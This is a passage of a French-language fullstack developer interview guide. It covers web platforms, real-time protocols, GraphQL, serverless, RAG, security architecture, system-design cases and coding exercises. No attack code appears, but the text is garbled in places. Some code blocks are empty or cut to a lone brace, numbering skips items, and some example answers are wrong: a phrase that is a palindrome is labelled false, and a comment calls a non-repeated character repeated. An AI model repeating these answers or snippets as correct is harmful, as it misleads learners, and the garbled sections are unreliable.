```
Caractéristiques clés : installable sur l'écran d'accueil (comme une app native), fonctionne partiellement hors ligne grâce au **service worker** (intercepte les requêtes réseau, sert depuis le cache), notifications push possibles. Permet une expérience proche du natif sans passer par les app stores, mais avec des limitations d'accès aux APIs matérielles selon la plateforme (particulièrement restreint sur iOS historiquement).

**251. WebAssembly (Wasm)**

Format binaire exécutable **dans le navigateur** à une vitesse proche du natif, écrit dans des langages compilés (Rust, C++, Go) plutôt qu'interprété comme le JavaScript.

```rust
// Rust compilé vers Wasm
#[no_mangle]
pub fn addition(a: i32, b: i32) -> i32 { a + b }
```
```js
// Appelé depuis JavaScript
const wasm = await WebAssembly.instantiateStreaming(fetch('module.wasm'));
console.log(wasm.instance.exports.addition(2, 3)); // 5
```
Cas d'usage : calcul intensif (traitement d'image/vidéo, jeux, simulations physiques, cryptographie), portage d'applications existantes en C++/Rust vers le web (ex: éditeurs comme Figma utilisent Wasm pour leur moteur de rendu). Ne remplace pas JS pour la logique applicative générale — complémentaire, pas concurrent, pour les portions vraiment coûteuses en calcul.

**252. React Native / Flutter**

```
React Native : écrit en JS/React, compile vers des composants natifs réels (pas de WebView)
               → partage la logique/les compétences avec le développement React web
Flutter       : écrit en Dart, dessine sa propre UI (moteur de rendu Skia), pas des composants natifs
               → rendu très cohérent entre iOS/Android, mais langage différent (Dart) à apprendre
```
```jsx

function Bouton() {

}
```
Les deux permettent de développer pour iOS **et** Android avec une seule base de code, contrairement au développement natif séparé (Swift/Kotlin). React Native est souvent préféré par les équipes déjà expérimentées en React (réutilisation de compétences) ; Flutter offre parfois de meilleures performances graphiques et une cohérence visuelle plus stricte entre plateformes.

## WebSockets & Temps Réel (253-255)

**253. WebSocket vs HTTP/2**

```
HTTP/2       : toujours requête/réponse, mais multiplexé (plusieurs requêtes en parallèle sur une connexion)
               — le serveur ne peut pas "pousser" spontanément des données sans requête initiale du client
WebSocket    : connexion persistante bidirectionnelle — client ET serveur peuvent envoyer des messages
               à tout moment, sans nouvelle requête HTTP à chaque fois
```
```js
const ws = new WebSocket('wss://monserveur.com/socket');
ws.onmessage = (event) => console.log('Reçu:', event.data);
ws.send('Bonjour serveur');
```
HTTP/2 Server Push existe mais reste dans le paradigme requête-initiée ; WebSocket est le seul des deux véritablement bidirectionnel en temps réel. Cas d'usage WebSocket : chat, jeux multijoueurs, éditeurs collaboratifs — tout ce qui nécessite une latence minimale dans les deux sens.

---

**254. Socket.io — chat en temps réel** *(complète la question 87)*

```js
// Serveur
io.on('connection', (socket) => {
  socket.join('salon-general'); // rooms pour grouper des utilisateurs
  socket.on('message', (texte) => {
    io.to('salon-general').emit('nouveauMessage', { texte, auteur: socket.id, date: new Date() });
  });
  socket.on('disconnect', () => console.log('Utilisateur déconnecté'));
});
```
```jsx
// Client React
useEffect(() => {
  const socket = io('https://monserveur.com');
  socket.on('nouveauMessage', (msg) => setMessages(prev => [...prev, msg]));
  return () => socket.disconnect(); // nettoyage à la destruction du composant
}, []);
```
Les **rooms** permettent de segmenter la diffusion (ex: un salon de chat spécifique reçoit uniquement les messages de ce salon, pas de tous les utilisateurs connectés au serveur).

**255. Server-Sent Events (SSE)**

```js
// Serveur — flux unidirectionnel serveur → client
app.get('/evenements', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  setInterval(() => {
    res.write(`data: ${JSON.stringify({ heure: new Date() })}\n\n`);
  }, 1000);
});
```
```js
// Client
const source = new EventSource('/evenements');
source.onmessage = (event) => console.log(JSON.parse(event.data));
```
SSE est **unidirectionnel** (serveur → client uniquement), plus simple que WebSocket à mettre en œuvre (fonctionne sur HTTP classique, reconnexion automatique native). À utiliser quand le client n'a pas besoin d'envoyer de données en temps réel — ex: notifications, fil d'actualité en direct, suivi de progression d'une tâche longue. WebSocket reste nécessaire dès qu'une communication bidirectionnelle est requise (chat).

## GraphQL & APIs Modernes (256-262)

**256-257. GraphQL — Query, Mutation, Subscription**

```graphql
# Query — lecture
query {
  utilisateur(id: 1) { nom, email }
}

# Mutation — écriture
mutation {
  creerUtilisateur(nom: "Essama", email: "e@test.com") { id }
}

# Subscription — écoute en temps réel (souvent via WebSocket en interne)
subscription {
  nouveauMessage(salonId: "1") { texte, auteur }
}
```
Les trois opérations couvrent respectivement lecture, écriture, et temps réel — contrairement à REST où ces distinctions passent par les verbes HTTP, GraphQL les rend explicites dans le langage de requête lui-même.

---

**258. Schema GraphQL (SDL)**

```graphql
type Utilisateur {
  id: ID!
  nom: String!
  email: String!
  commandes: [Commande!]! # relation directe dans le schéma
}

type Query {
  utilisateur(id: ID!): Utilisateur
  utilisateurs: [Utilisateur!]!
}

type Mutation {
  creerUtilisateur(nom: String!, email: String!): Utilisateur!
}
```
Le `!` signifie "non-nullable" (ce champ ne peut jamais être `null`). Le schéma définit un **contrat strict et typé** entre le client et le serveur — le client sait exactement quels champs existent et leur type, et les outils (autocomplétion, validation) s'appuient dessus.

---

**259. Resolvers**

```js
const resolvers = {
  Query: {
    utilisateur: async (parent, { id }, context) => {
      return await UserRepository.findById(id);
    }
  },
  Utilisateur: {
    // resolver pour un CHAMP spécifique, appelé seulement si le client demande "commandes"
    commandes: async (parent, args, context) => {
      return await CommandeRepository.findByUserId(parent.id);
    }
  }
};
```
Chaque champ du schéma a une fonction (resolver) qui sait comment récupérer sa valeur — GraphQL appelle ces fonctions selon les champs réellement demandés par le client. **Piège classique** : un resolver de champ imbriqué (ex: `commandes`) appelé une fois par utilisateur dans une liste peut recréer le problème **N+1** vu en question 158 — solution via **DataLoader** (batch et cache les requêtes similaires en une seule).

---

**260. Apollo Client / Apollo Server**

```jsx
// Apollo Client — gestion de requêtes + cache normalisé côté front
const { data, loading, error } = useQuery(gql`
  query { utilisateur(id: 1) { nom, email } }
`);
```
```js
// Apollo Server — implémentation du serveur GraphQL
const server = new ApolloServer({ typeDefs, resolvers });
```
Apollo gère automatiquement le **cache normalisé** côté client (une entité mise à jour une fois se répercute partout où elle est utilisée dans l'UI, sans re-fetch manuel), simplifiant énormément la gestion d'état comparé à un fetch manuel classique.

---

**261. Auth et autorisation en GraphQL**

```js
const server = new ApolloServer({
  typeDefs,
  resolvers,
  context: ({ req }) => {
    const token = req.headers.authorization;
    const user = verifierToken(token); // décode le JWT
    return { user }; // injecté dans TOUS les resolvers
  }
});

// Dans un resolver
const resolvers = {
  Mutation: {
    supprimerUtilisateur: (parent, args, context) => {
      if (!context.user || context.user.role !== 'admin') {
        throw new Error("Non autorisé");
      }
      // ...
    }
  }
};
```
Contrairement à REST où l'auth se fait souvent au niveau de la **route**, GraphQL n'ayant qu'un seul endpoint, l'autorisation doit être vérifiée **dans chaque resolver** qui en a besoin (souvent via le `context` partagé, ou des directives de schéma comme `@auth`).

---

**262. Batching et caching GraphQL**

```js
// DataLoader — regroupe plusieurs requêtes individuelles en UNE SEULE requête batch
const userLoader = new DataLoader(async (ids) => {
  const users = await User.findByIds(ids); // une seule requête DB pour tous les IDs
  return ids.map(id => users.find(u => u.id === id));
});

// Utilisé dans un resolver, même appelé plusieurs fois dans la même requête GraphQL
const user = await userLoader.load(id); // automatiquement groupé avec les autres .load() de ce cycle
```
Le **batching** résout le N+1 (vu en 259) en regroupant les appels individuels survenus pendant le même cycle d'exécution. Le **caching** (au sein d'une requête ou via Apollo Client côté front) évite de re-résoudre deux fois la même donnée si elle est demandée à plusieurs endroits du graphe de requête.

## Cloud Native & Serverless (263-266)

**263. Serverless — avantages et inconvénients** *(complète la question 170)*

```
Avantages : scaling automatique et instantané, facturation à l'usage réel (pas de coût si inactif),
            zéro gestion de serveur/patch OS, déploiement rapide de fonctions isolées
Inconvénients : cold start (latence au premier appel après inactivité), vendor lock-in
                (code souvent couplé aux spécificités du cloud provider), débogage/tests locaux
                plus complexes, durée d'exécution limitée (inadapté aux tâches longues), coûts
                imprévisibles en cas de pic de trafic massif inattendu
```

---

**264. FaaS (Function as a Service)**

```js
// AWS Lambda — une fonction isolée, sans état persistant entre les appels
exports.handler = async (event) => {
  const { montant } = JSON.parse(event.body);
  return { statusCode: 200, body: JSON.stringify({ total: montant * 1.2 }) };
};
```
FaaS est l'implémentation concrète du concept "serverless" — chaque fonction est **stateless** et déclenchée par un événement (requête HTTP, message de queue, upload de fichier). Contrairement à une app serveur classique qui tourne en continu, une fonction FaaS n'existe que le temps de son exécution — d'où la facturation précise à la milliseconde d'exécution.

---

**265. Edge Computing**

```
CDN classique : cache des fichiers STATIQUES près de l'utilisateur (images, CSS, JS)
Edge Computing : exécute du CODE (pas juste du contenu statique) au plus près géographiquement de l'utilisateur
```
```js
// Cloudflare Workers — code exécuté sur le nœud edge le plus proche du visiteur
export default {
  async fetch(request) {
    const pays = request.cf.country; // info géographique disponible directement à l'edge
    return new Response(`Bonjour depuis ${pays}`);
  }
};
```
Bénéfice : latence minimale car le calcul se fait physiquement proche de l'utilisateur, plutôt que dans un datacenter central potentiellement à des milliers de km. Cas d'usage : personnalisation géographique, A/B testing, authentification légère, redirection — pas adapté aux calculs lourds ou avec accès DB centralisée fréquent (l'aller-retour vers la DB centrale annulerait le bénéfice de latence).

---

**266. 12-factor app**

Ensemble de bonnes pratiques pour construire des applications cloud-native robustes et portables. Principes clés :

```
1. Codebase   : un seul dépôt versionné, plusieurs déploiements (dev/staging/prod) depuis ce même code
3. Config     : configuration dans des variables d'environnement, jamais codée en dur
6. Processes  : l'application est stateless — l'état persiste en DB/cache externe, pas en mémoire locale du process
9. Disposability : démarrage/arrêt rapides, tolère un arrêt brutal (SIGTERM) sans perte de données
```
Pourquoi c'est important : ces principes rendent l'application compatible avec le scaling horizontal, les redémarrages fréquents de Kubernetes/serverless, et les déploiements automatisés — une app qui stocke un état en mémoire locale (factor 6 violé) casse dès qu'elle tourne sur plusieurs instances.

**268. Embeddings**

Une représentation numérique (vecteur de centaines/milliers de dimensions) d'un texte, capturant son **sens sémantique** — des textes proches en signification ont des vecteurs proches dans cet espace.

```js
const embedding = await client.embeddings.create({
  model: "text-embedding-3-small",
  input: "Comment réinitialiser mon mot de passe ?"
});
// → [0.023, -0.451, 0.128, ...] (vecteur de nombres)
```
Cas d'usage : recherche sémantique (trouver des documents pertinents même sans mots-clés exacts communs), détection de doublons, recommandation de contenu similaire, classification. La proximité se mesure généralement par similarité cosinus entre vecteurs.

---

**269. RAG (Retrieval-Augmented Generation)**

```
1. La question de l'utilisateur est transformée en embedding
2. Recherche des documents les plus proches sémantiquement dans une base vectorielle
3. Ces documents pertinents sont injectés dans le PROMPT envoyé au modèle IA
4. Le modèle génère une réponse basée sur ce contexte spécifique, pas seulement sa mémoire d'entraînement
```
```js
const contexte = await rechercherDocumentsPertinents(question); // étape 1-2
const reponse = await client.chat.completions.create({
  messages: [
    { role: "system", content: `Réponds en te basant sur ce contexte: ${contexte}` },
    { role: "user", content: question }
  ]
});
```
Résout deux limites des modèles IA seuls : la connaissance figée à leur date d'entraînement, et l'absence de connaissance de données privées/spécifiques (documentation interne, base de connaissances d'entreprise) — sans avoir à ré-entraîner le modèle, juste en lui fournissant le contexte pertinent au moment de la requête.

**270. Bases de données vectorielles (Pinecone, Weaviate)**

```js
await index.upsert([
  { id: "doc1", values: embeddingDoc1, metadata: { titre: "Guide connexion" } }
]);

const resultats = await index.query({
  vector: embeddingRequete,
  topK: 5 // les 5 documents les plus proches sémantiquement
});
```
Optimisées spécifiquement pour la recherche de **similarité approximative** rapide parmi des millions de vecteurs (via des index type HNSW), ce qu'une base SQL/NoSQL classique gère très mal à grande échelle. Alternative : certaines DB classiques (PostgreSQL avec l'extension `pgvector`) ajoutent cette capacité sans base dédiée séparée, suffisant pour des volumes modérés.

## Sécurité Avancée (271-273)

**271. API Gateway pour sécuriser des microservices**

```
Client → API Gateway → [Service Auth, Service Commandes, Service Paiement...]
         (authentification, rate limiting, routing, logging centralisés ICI)
```
```js
// Exemple conceptuel : le gateway vérifie le token UNE FOIS avant de router
app.use(async (req, res, next) => {
  const user = await verifierToken(req.headers.authorization);
  if (!user) return res.status(401).send();
  req.user = user;
  next();
}, proxy('service-commandes')); // puis transmet la requête au bon microservice
```
Centralise les préoccupations transversales (auth, rate limiting, SSL termination, logging) en **un seul point d'entrée**, évitant de dupliquer cette logique dans chaque microservice individuellement. Les microservices internes n'ont pas besoin d'être exposés directement à internet — seul le gateway l'est.

---

**272. Zero Trust Security**

Principe : **ne jamais faire confiance implicitement**, même à l'intérieur du réseau interne de l'entreprise — chaque requête est vérifiée, peu importe son origine (contrairement au modèle traditionnel "périmètre de confiance" où tout ce qui est dans le réseau interne était considéré comme sûr).

```
Modèle traditionnel : "Vous êtes dans le réseau interne → vous êtes de confiance"
Zero Trust           : "Chaque requête est vérifiée, quelle que soit son origine (réseau interne inclus)"
```
En pratique : authentification/autorisation systématique service-à-service (pas seulement client-à-serveur), segmentation réseau fine, principe du moindre privilège strict, vérification continue plutôt qu'une seule fois à la connexion. Devenu essentiel avec le télétravail massif et les architectures cloud/microservices où le "périmètre réseau" traditionnel n'a plus vraiment de sens.

---

**273. DevSecOps**

Intègre la sécurité **tout au long** du pipeline CI/CD, au lieu d'un audit de sécurité ponctuel juste avant la mise en production.

```yaml
# Étapes de sécurité intégrées au pipeline CI
- run: npm audit --audit-level=high  # scan des dépendances
- run: snyk test                      # scan de vulnérabilités approfondi
- run: docker scan mon-image           # scan de l'image Docker
- run: eslint --plugin security         # analyse statique du code (SAST)
```
Philosophie "shift left" : détecter les problèmes de sécurité **le plus tôt possible** dans le cycle de développement (dès le commit) plutôt qu'en fin de chaîne où la correction coûte bien plus cher et retarde la livraison.

## Sujets d'Actualité (280-284)

**280. Impact de l'IA générative sur le développement fullstack**

Changements observables : accélération de l'écriture de code répétitif/boilerplate (composants CRUD, tests basiques), assistance dans le debugging et la compréhension de code legacy inconnu, mais nécessité accrue de **vérifier et comprendre** le code généré plutôt que de le copier aveuglément (l'IA peut halluciner des APIs inexistantes ou des vulnérabilités). **281. AI-powered code assistants (Copilot, Cursor)**

```
Bonnes pratiques d'usage efficace :
- Fournir du contexte clair (noms de variables explicites, commentaires d'intention) → meilleures suggestions

- Vérifier les dépendances suggérées (l'IA peut halluciner des noms de packages qui n'existent pas)
```
Différence notable : Copilot s'intègre comme autocomplétion contextuelle dans l'éditeur, Cursor va plus loin avec une compréhension du codebase entier et des modifications multi-fichiers pilotées par instructions en langage naturel — la tendance 2026 va vers des assistants de plus en plus "agentiques" capables de tâches multi-étapes.

**283. Micro-frontend**

Cas d'usage : grandes organisations avec plusieurs équipes front-end autonomes sur un produit unique (ex: Amazon, où catalogue/panier/paiement peuvent être des équipes séparées). **Piège fréquent** : adopter les micro-frontends sur un produit géré par une seule petite équipe — ajoute une complexité d'intégration (cohérence visuelle, duplication de dépendances) sans bénéfice réel d'autonomie d'équipe.

Pour ce type de question, il n'y a pas de "bonne réponse unique" — l'évaluateur regarde la démarche : clarifier les besoins, dimensionner, proposer une architecture simple puis l'améliorer, discuter les compromis.

**285. URL Shortener (type Bitly)**

**1. Clarifier les besoins**
```
Fonctionnel : POST une longue URL → reçoit une URL courte ; GET URL courte → redirige vers l'originale
Non-fonctionnel : forte proportion de lectures vs écritures (~100:1), faible latence de redirection,
                   URLs courtes non devinables facilement
Échelle : ex. 100M nouvelles URLs/mois, 10 milliards de redirections/mois
```

**2. Conception de l'ID court**
```js
// Option 1 : hash de l'URL (MD5) tronqué — risque de collision, à gérer
// Option 2 : compteur auto-incrémenté encodé en base62 (a-z, A-Z, 0-9)
function encoderBase62(id) {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let resultat = '';
  while (id > 0) { resultat = chars[id % 62] + resultat; id = Math.floor(id / 62); }
  return resultat;
}
// ID 125 → "cb" par exemple — 7 caractères base62 couvrent 62^7 ≈ 3.5 mille milliards de combinaisons
```

**3. Architecture**
```
Client → Load Balancer → Serveurs API (stateless) → Cache (Redis, URLs les + demandées)
                                                    → Base de données (mapping court ↔ long)
```

**4. Points clés à discuter**
- Génération d'ID distribuée (plusieurs serveurs ne doivent jamais générer le même ID) → un service dédié qui distribue des plages d'ID, ou un système type Snowflake (Twitter).
- Cache agressif en lecture (Redis) car les redirections sont bien plus fréquentes que les créations — 80% du trafic touche souvent 20% des URLs (loi de Pareto).
- Redirection HTTP 301 (permanente, cachée par le navigateur) vs 302 (temporaire, permet de tracker chaque clic pour des analytics) — trade-off explicite à mentionner.
- Base de données : simple table clé-valeur suffit largement (SQL ou NoSQL), pas besoin de relations complexes.

**286. Messagerie instantanée (type WhatsApp)**

**1. Besoins clés**
```
Envoi/réception de messages en temps réel, indicateurs de lecture/livraison, présence en ligne,
messages hors ligne stockés jusqu'à reconnexion, potentiellement chiffrement de bout en bout
```

**2. Architecture**
```
Client A → WebSocket → Serveur de connexion → Message Queue (Kafka/RabbitMQ) → Serveur de connexion → Client B
                              ↓
                        Base de données (historique des messages, persistant)
```

**3. Points clés**
- **Connexion persistante** (WebSocket) par utilisateur connecté, gérée par un pool de serveurs — nécessite un registre (ex: Redis) qui sait "quel serveur héberge la connexion de quel utilisateur", car avec du scaling horizontal, l'expéditeur et le destinataire ne sont pas forcément connectés au même serveur.
- **Messages hors ligne** : si le destinataire n'est pas connecté, le message est stocké en DB et poussé (notification push) dès sa reconnexion.
- **Ordre des messages** : chaque message a un timestamp/ID séquentiel pour garantir l'ordre d'affichage même en cas de latence réseau variable.
- **Scalabilité** : sharding des utilisateurs par région géographique pour réduire la latence, réplication de la DB pour la disponibilité.

**287. Streaming vidéo (type Netflix)**

**1. Besoins clés**
```
Upload et transcodage de vidéos en plusieurs qualités, lecture fluide avec adaptation au débit réseau,
distribution mondiale à faible latence, gestion de millions de visionnages simultanés
```

**2. Architecture**
```
Upload → Stockage brut (S3) → Pipeline de transcodage (plusieurs résolutions/bitrates : 480p, 720p, 1080p, 4K)
       → Distribution via CDN (contenu proche géographiquement de chaque utilisateur)
       → Client utilise ABR (Adaptive Bitrate Streaming) pour choisir la qualité selon sa connexion en temps réel
```

**3. Points clés**
- **Transcodage** : une vidéo uploadée est découpée en segments courts (ex: 2-10 secondes) et encodée en plusieurs qualités (HLS ou DASH) — le lecteur change dynamiquement de qualité entre segments selon la bande passante disponible, sans interruption.
- **CDN massif** : le contenu vidéo (très volumineux) doit être servi depuis des serveurs proches de chaque utilisateur pour éviter une latence énorme — c'est le poste de coût/complexité le plus critique de ce type de système.
- **Métadonnées vs contenu vidéo** : séparer clairement la base de données "métadonnées" (titre, description, catalogue — SQL classique) du stockage massif des fichiers vidéo eux-mêmes (object storage comme S3, jamais en DB relationnelle).
- **Recommandations** : généralement un système séparé (souvent basé sur du ML), alimenté par les données de visionnage stockées en parallèle du service de streaming lui-même.

**288. Système de réservation (type Airbnb)**

**1. Besoins clés**
```
Recherche de logements disponibles (filtres : dates, lieu, prix), réservation SANS double-booking,
paiement, gestion des annulations
```

**2. Le défi central : éviter le double-booking**
```sql
BEGIN;
SELECT * FROM disponibilites
WHERE logement_id = 42 AND date BETWEEN '2026-10-01' AND '2026-10-05'
FOR UPDATE; -- verrouille ces lignes le temps de la transaction

-- Vérifier qu'aucune réservation n'existe déjà sur cette plage
INSERT INTO reservations (logement_id, date_debut, date_fin, user_id) VALUES (...);
COMMIT;
```
Le verrouillage transactionnel (`FOR UPDATE`) empêche deux utilisateurs de réserver simultanément le même logement sur les mêmes dates — un point critique du design, souvent la question précise posée par l'évaluateur.

**3. Architecture**
```
Recherche (lecture intensive, tolère un léger délai) : index sur (lieu, dates, prix), cache agressif
Réservation (écriture critique, doit être STRICTEMENT cohérente) : transaction avec verrouillage
             ou "réservation optimiste" avec contrainte d'unicité en DB qui rejette les conflits
```
**Point à discuter** : séparer le chemin de lecture (recherche, très fréquent, peut tolérer un cache légèrement périmé) du chemin d'écriture (réservation, rare mais doit être parfaitement cohérent) — pattern proche de CQRS vu en question 214.

**289. Feed social (type Twitter/X)**

**1. Besoins clés**
```
Publier un post, voir le fil des personnes suivies, forte disproportion lecture/écriture,
certains comptes ont des millions de followers ("célébrités")
```

**2. Deux stratégies de génération du feed**

```
Fan-out à l'écriture (push) :
  Quand X publie, le post est immédiatement copié dans le feed de CHACUN de ses followers
  → lecture du feed ultra rapide (déjà pré-calculé)
  → problème : un compte à 50M followers génère 50M écritures pour UN SEUL post

Fan-out à la lecture (pull) :
  Le feed est calculé À LA DEMANDE, en agrégeant les posts récents de tous les comptes suivis
  → écriture instantanée peu importe le nombre de followers
  → problème : lecture plus lente, recalcul à chaque consultation du feed
```

**3. Solution hybride (approche réelle utilisée par Twitter)**
```
- Comptes normaux : fan-out à l'écriture (push immédiat vers les followers)
- Comptes "célébrités" (millions de followers) : fan-out à la lecture
  → leurs posts sont récupérés à la demande et fusionnés au feed pré-calculé au moment de la consultation
```
Ce compromis évite le problème extrême du "hot user" tout en gardant une lecture rapide pour la majorité des utilisateurs normaux — c'est typiquement le point qui distingue une bonne réponse d'entretien d'une réponse superficielle.

**290. E-commerce (type Amazon)**

**1. Besoins clés**
```
Catalogue produit (recherche, filtres), panier, commande, paiement, gestion des stocks
en temps réel, éviter de vendre un produit en rupture de stock
```

**2. Architecture en services séparés**
```
Service Catalogue  : recherche/affichage produits (lecture intensive, cache agressif, souvent Elasticsearch)
Service Panier     : état temporaire par utilisateur (souvent Redis, TTL raisonnable)
Service Commande    : création de commande, orchestration du processus d'achat
Service Stock       : gestion des quantités disponibles, doit être STRICTEMENT cohérent
Service Paiement    : intégration avec un prestataire externe (Stripe...), jamais de données de carte stockées directement
```

**3. Le défi central : gestion du stock**
```sql
-- Décrémenter le stock UNIQUEMENT si suffisant, de façon atomique
UPDATE stock SET quantite = quantite - 1
WHERE produit_id = 42 AND quantite > 0
RETURNING quantite;
-- Si 0 ligne affectée → rupture de stock, rejeter la commande AVANT le paiement
```
**Points à discuter** : réserver le stock temporairement pendant le processus de paiement (éviter qu'un produit soit "vendu" en même temps par deux clients pendant que l'un finalise son paiement), avec libération automatique après un timeout si le paiement n'aboutit pas. Architecture orientée événements (Service Commande publie "CommandeCreee" → Service Stock, Service Email, Service Analytics réagissent indépendamment) pour découpler ces préoccupations.

**292. Vérifier si une chaîne est un palindrome**

```js
function estPalindrome(str) {
  const nettoyee = str.toLowerCase().replace(/[^a-z0-9]/g, ''); // ignore espaces/ponctuation/casse
  return nettoyee === nettoyee.split('').reverse().join('');
}
console.log(estPalindrome("Engage le jeu que je le gagne")); // false (juste un exemple, vraie phrase FR palindrome rare)
console.log(estPalindrome("radar")); // true

// Version optimisée : deux pointeurs, s'arrête dès qu'une différence est trouvée (pas besoin de tout inverser)
function estPalindromeOptimise(str) {
  const s = str.toLowerCase().replace(/[^a-z0-9]/g, '');
  let gauche = 0, droite = s.length - 1;
  while (gauche < droite) {
    if (s[gauche] !== s[droite]) return false;
    gauche++; droite--;
  }
  return true;
}
```
**Cas limite à traiter** : chaîne vide ou d'un seul caractère → toujours un palindrome (`""` et `"a"` retournent `true`), à vérifier explicitement en entretien.

**293. Nombre le plus fréquent dans un tableau**

```js
function nombrePlusFrequent(arr) {
  if (arr.length === 0) return null; // cas limite : tableau vide

  const compteur = {};
  let maxCompte = 0;
  let resultat = arr[0];

  for (const nombre of arr) {
    compteur[nombre] = (compteur[nombre] || 0) + 1;
    if (compteur[nombre] > maxCompte) {
      maxCompte = compteur[nombre];
      resultat = nombre;
    }
  }
  return resultat;
}
console.log(nombrePlusFrequent([1, 3, 2, 3, 3, 1])); // 3
```
Complexité O(n), une seule passe. **Piège fréquent** : ne pas gérer le cas d'égalité (plusieurs nombres avec la même fréquence max) — préciser avec l'évaluateur si on veut le premier trouvé, le plus petit, ou tous.

**294. Fusionner deux tableaux triés**

```js
function fusionnerTriees(arr1, arr2) {
  const resultat = [];
  let i = 0, j = 0;

  while (i < arr1.length && j < arr2.length) {
    if (arr1[i] <= arr2[j]) resultat.push(arr1[i++]);
    else resultat.push(arr2[j++]);
  }
  // ajouter les éléments restants (un seul des deux tableaux, l'autre est déjà épuisé)
  while (i < arr1.length) resultat.push(arr1[i++]);
  while (j < arr2.length) resultat.push(arr2[j++]);

  return resultat;
}
console.log(fusionnerTriees([1, 3, 5], [2, 4, 6])); // [1,2,3,4,5,6]
```
Complexité O(n+m) — bien plus efficace que fusionner puis re-trier (`[...arr1, ...arr2].sort()` serait O((n+m) log(n+m))). C'est exactement l'étape "merge" de l'algorithme MergeSort vu en question 42.

**295. Implémenter un debounce** *(déjà vu en question 47, rappel condensé)*

```js
}
```

**296. Implémenter un throttle**

```js
function throttle(fn, delai) {
  let enAttente = false;
  return function(...args) {
    if (enAttente) return; // ignore les appels pendant la période de blocage
    fn.apply(this, args);
    enAttente = true;
    setTimeout(() => { enAttente = false; }, delai);
  };
}

const scrollThrottled = throttle(() => console.log("Position scroll traitée"), 200);
window.addEventListener('scroll', scrollThrottled); // exécute au max une fois toutes les 200ms
```
Différence avec debounce (voir question 47) : throttle garantit une exécution **régulière** pendant une activité continue, debounce attend une **pause** avant d'exécuter.

**297. Deep clone d'un objet**

```js
// Solution simple mais limitée (perd les fonctions, Date devient string, ne gère pas les références circulaires)
function deepCloneSimple(obj) {
  return JSON.parse(JSON.stringify(obj));
}

// Solution manuelle plus robuste
function deepClone(obj) {
  if (obj === null || typeof obj !== 'object') return obj; // cas de base : primitif
  if (obj instanceof Date) return new Date(obj);
  if (Array.isArray(obj)) return obj.map(item => deepClone(item));

  const clone = {};
  for (const cle in obj) {
    if (obj.hasOwnProperty(cle)) clone[cle] = deepClone(obj[cle]); // récursif
  }
  return clone;
}

const original = { nom: "Essama", date: new Date(), adresse: { ville: "Douala" } };
const copie = deepClone(original);
copie.adresse.ville = "Yaoundé";
console.log(original.adresse.ville); // "Douala" — pas affecté, vraie copie profonde
```
**Cas limite important à mentionner en entretien** : les références circulaires (`obj.self = obj`) font boucler une implémentation naïve à l'infini — une solution complète utilise un `Map` pour tracker les objets déjà clonés. La méthode native `structuredClone(obj)` (disponible nativement en JS moderne) gère déjà correctement la plupart de ces cas.

**298. Implémenter une Promise (polyfill simplifié)**

```js
class MaPromise {
  constructor(executeur) {
    this.statut = 'pending';
    this.valeur = undefined;
    this.callbacks = [];

    const resolve = (valeur) => {
      if (this.statut !== 'pending') return;
      this.statut = 'fulfilled';
      this.valeur = valeur;
      this.callbacks.forEach(cb => cb.onFulfilled(valeur));
    };
    const reject = (erreur) => {
      if (this.statut !== 'pending') return;
      this.statut = 'rejected';
      this.valeur = erreur;
      this.callbacks.forEach(cb => cb.onRejected(erreur));
    };

    try { executeur(resolve, reject); } catch (err) { reject(err); }
  }

  then(onFulfilled, onRejected) {
    return new MaPromise((resolve, reject) => {
      const gererFulfilled = (valeur) => {
        try { resolve(onFulfilled ? onFulfilled(valeur) : valeur); } catch (err) { reject(err); }
      };
      const gererRejected = (erreur) => {
        try { onRejected ? resolve(onRejected(erreur)) : reject(erreur); } catch (err) { reject(err); }
      };

      if (this.statut === 'fulfilled') gererFulfilled(this.valeur);
      else if (this.statut === 'rejected') gererRejected(this.valeur);
      else this.callbacks.push({ onFulfilled: gererFulfilled, onRejected: gererRejected });
    });
  }
}

new MaPromise((resolve) => setTimeout(() => resolve(42), 100))
  .then(v => console.log("Résultat:", v)); // "Résultat: 42" après 100ms
```
Cette question teste la compréhension profonde du fonctionnement interne des Promises (état, callbacks en attente, chaînage) plutôt que leur simple usage — fréquente en entretien senior.

**299. Implémenter un `map` personnalisé**

```js
Array.prototype.monMap = function(callback) {
  const resultat = [];
  for (let i = 0; i < this.length; i++) {
    if (i in this) { // gère les tableaux "creux" (sparse arrays) comme le vrai map
      resultat.push(callback(this[i], i, this));
    }
  }
  return resultat;
};

console.log([1, 2, 3].monMap(x => x * 2)); // [2, 4, 6]
```

**300. Premier caractère non répété dans une chaîne**

```js
function premierCaractereNonRepete(str) {
  const compteur = {};

  // Première passe : compter les occurrences de chaque caractère
  for (const char of str) {
    compteur[char] = (compteur[char] || 0) + 1;
  }

  // Deuxième passe : trouver le premier avec un compte de 1, EN GARDANT L'ORDRE d'origine
  for (const char of str) {
    if (compteur[char] === 1) return char;
  }
  return null; // aucun caractère non répété
}
console.log(premierCaractereNonRepete("essama")); // "e" — répété ! en fait "s" est répété aussi... testons "abcabd"
console.log(premierCaractereNonRepete("abcabd")); // "c"
```
Complexité O(n) — deux passes séparées mais toujours linéaire (pas O(n²) comme le ferait une recherche imbriquée naïve `indexOf`/`lastIndexOf` pour chaque caractère). **Point clé** : la deuxième passe re-parcourt la chaîne dans l'**ordre d'origine** (pas l'objet `compteur`, dont l'ordre des clés n'est pas garanti fiable pour ce usage) pour garantir de retourner le bon "premier" caractère.
